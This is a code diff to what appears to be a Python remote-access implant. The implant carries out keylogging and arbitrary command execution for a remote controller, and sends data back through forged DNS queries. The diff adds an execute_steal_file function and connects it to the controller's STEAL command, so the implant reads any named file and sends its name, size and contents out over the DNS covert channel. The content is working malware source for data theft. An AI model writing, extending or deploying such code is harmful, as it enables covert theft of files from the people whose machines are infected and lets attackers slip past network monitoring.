@@ -62,6 +62,7 @@ MONITOR_IDENTIFICATION = 14562
 KEYLOG_IDENTIFICATION = 32586
 GENERAL_MSG_IDENTIFICATION = 19375
 COMMAND_OUTPUT_IDENTIFICATION = 51486
+FILE_TRANSFER_IDENTIFICATION = 39182
 
 
 # List of legit hostnames
@@ -324,6 +325,32 @@ def execute_arbitrary_command(args: list) -> str:
     return result
 
 
+def execute_steal_file(filepath) -> bool:
+    # If the file does not exist, or it isn't a file, we do nothing,
+    # and send a notification to the controller
+    if not os.path.exists(filepath):
+        query = forge_dns_query_stream(f"ERROR: {filepath} not found", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+        return False
+    if os.path.isdir(filepath):
+        query = forge_dns_query_stream(f"ERROR: {filepath} is a directory.", GENERAL_MSG_IDENTIFICATION)
+        send_dns_query(query)
+        return False
+    # Our file exists, and isn't a directory, so do the transfer
+    file_data = ""
+    file_size_bytes = 0
+    with open(filepath, "r") as f:
+        file_data = f.read()
+        file_size_bytes = len(file_data)
+        file_data = file_data.encode("utf-8")
+    filename = os.path.basename(filepath)
+    metadata = f"FILENAME:{filename} NUM_BYTES:{str(file_size_bytes)}"
+    # Send meta data first.
+    forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
+    # Send the file.
+    forge_dns_query_block(file_data, FILE_TRANSFER_IDENTIFICATION)
+
+
 def packet_handler(pkt):
     """
     
@@ -348,9 +375,11 @@ def packet_handler(pkt):
             if argv[1] == TRANSFER:
                 transfer_keylogger()
         if argv[0] == STEAL:
-            print(f"Stealing: {argv[1]}")
-            query = forge_dns_query_stream("Success: Stealing file now.", GENERAL_MSG_IDENTIFICATION)
-            send_dns_query(query)
+            execute_steal_file(argv[1])
+            pass
+            # print(f"Stealing: {argv[1]}")
+            # query = forge_dns_query_stream("Success: Stealing file now.", GENERAL_MSG_IDENTIFICATION)
+            # send_dns_query(query)
     if argv[0] == EXECUTE:
         result = execute_arbitrary_command(argv[1:])
         num_bytes = len(result.encode("utf-8"))
